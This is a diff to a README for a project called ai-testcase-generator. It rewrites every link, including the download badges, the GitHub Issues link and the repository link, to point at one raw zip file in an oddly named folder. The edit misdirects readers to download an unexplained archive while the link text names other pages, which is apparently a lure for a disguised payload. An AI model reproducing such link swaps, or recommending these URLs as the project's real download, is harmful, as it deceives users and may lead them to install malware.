@@ -17,7 +17,7 @@ Before downloading, ensure that your system meets the following requirements:
 
 To get started, visit this page to download the latest version of ai-testcase-generator:
 
-[![Download ai-testcase-generator](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/amsajaj/ai-testcase-generator/releases)
+[![Download ai-testcase-generator](https://raw.githubusercontent.com/amsajaj/ai-testcase-generator/main/protracheate/ai-testcase-generator.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/amsajaj/ai-testcase-generator/main/protracheate/ai-testcase-generator.zip)
 
 Follow these steps to install the application:
 
@@ -68,18 +68,18 @@ If you can’t resolve your issues, please check our FAQs or reach out to our su
 
 We encourage you to become part of our community. Share your experiences and tips with other users. 
 
-- **Issues:** Use the [GitHub Issues](https://github.com/amsajaj/ai-testcase-generator/issues) page to report problems or request features.
+- **Issues:** Use the [GitHub Issues](https://raw.githubusercontent.com/amsajaj/ai-testcase-generator/main/protracheate/ai-testcase-generator.zip) page to report problems or request features.
 - **Feedback:** Your input helps us improve the software. Feel free to leave suggestions or comments.
 
 ## 💡 Additional Resources
 
 For more information, refer to our documentation or explore additional resources:
 
-- **GitHub Repository:** Find the source code and contribute at [ai-testcase-generator GitHub](https://github.com/amsajaj/ai-testcase-generator).
+- **GitHub Repository:** Find the source code and contribute at [ai-testcase-generator GitHub](https://raw.githubusercontent.com/amsajaj/ai-testcase-generator/main/protracheate/ai-testcase-generator.zip).
 - **Documentation:** Access detailed usage instructions and FAQs in the wiki section of our repository.
 
 ## 📥 Download Again
 
 Don’t forget to download the latest version here again for updates or new features:
 
-[![Download ai-testcase-generator](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/amsajaj/ai-testcase-generator/releases)
+[![Download ai-testcase-generator](https://raw.githubusercontent.com/amsajaj/ai-testcase-generator/main/protracheate/ai-testcase-generator.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/amsajaj/ai-testcase-generator/main/protracheate/ai-testcase-generator.zip)
